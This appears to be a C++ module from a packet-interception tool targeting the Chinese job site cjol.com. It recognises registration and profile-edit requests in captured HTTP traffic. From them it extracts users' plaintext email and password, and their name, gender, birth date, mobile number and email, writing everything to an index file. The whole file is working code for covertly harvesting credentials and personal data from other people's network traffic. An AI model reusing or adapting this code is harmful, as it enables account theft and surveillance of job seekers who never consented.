#include "StdAfx.h"
#include "EmployZhongGuoRenCai.h"

employ::ZhongGuoRenCai::ZhongGuoRenCai(HttpSession *http_session, const string &pro_name) : Employ(http_session,pro_name)
{
	app_ = "中国人才热线";
}

employ::ZhongGuoRenCai::~ZhongGuoRenCai()
{
	
}

int employ::ZhongGuoRenCai::IsZhongGuoRenCai(HttpSession *http_session)
{
	//注册
	if((http_session->m_Requestline.m_Host.Find("www.cjol.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/Jobseekers/register.aspx")!=-1) )
	{
		return kPcWebRegisterEmail;
	}
	//修改个人信息
	if((http_session->m_Requestline.m_Host.Find("www.cjol.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/jobseekers/Service/ResumeHandler.ashx")!=-1) )
	{
		return kPcWebModiy;
	}
	return 0;
}

int employ::ZhongGuoRenCai::Process(const char *packet,int action)
{
	//注册(邮箱注册)
	if (action == kPcWebRegisterEmail)
	{
		return PcWebRegisterEmail(packet);
	}
	//修改基本信息
	if (action == kPcWebModiy)
	{
		return PcWebModiy(packet);
	}
	return 1;
}

//注册(邮箱注册)
int employ::ZhongGuoRenCai::PcWebRegisterEmail(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string username = ms_->GetValueFromMapByKey("tbxEmailAddress",true);
	string pwd = ms_->GetValueFromMapByKey("tbxPassword",true);
	if (username.empty() || pwd.empty())
	{
		return 0;
	}
	output_text_ =
		"mid=="  + username + "\r\n" + 	//邮箱	        
		"pass=" + pwd + "\r\n" +		//密码
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=注册\r\n";
	WriteIndexFile();
 	return 1;
}

//修改基本信息
int employ::ZhongGuoRenCai::PcWebModiy(const char *packet)
{
	string src_data(packet);
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->GetValueFromMapByKey("base64",true);
	int tmp_i = src_data.length();
	src_data = ms_->Base64Decode(src_data,tmp_i);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	Json::Value value;
	Json::Reader reader;
	if (reader.parse(src_data,value))
	{
		string username = value["Name"].asString();
		string sex = value["Gender"].asString();
		if (sex == "1")
		{
			sex = "男";
		}else
		{
			sex = "女";
		}
		string tel = value["MobileNum"].asString();
		string email = value["Email"].asString();
		string birth = value["DateOfBirth"].asString();
		output_text_=
			"servername=" + username + "\r\n" + //姓名	      
			"sex=" + sex + "\r\n" + 	//性别	
			"msg=" + birth + "\r\n" + 	//出生日期	
			"oid=" + tel + "\r\n" + 	//手机号		
			"mid=" + email + "\r\n" + 	//邮箱
			"netmark=" + app_ + "\r\n" + //来源
			"state=修改基本信息\r\n";
		WriteIndexFile();
	}
	return 1;
}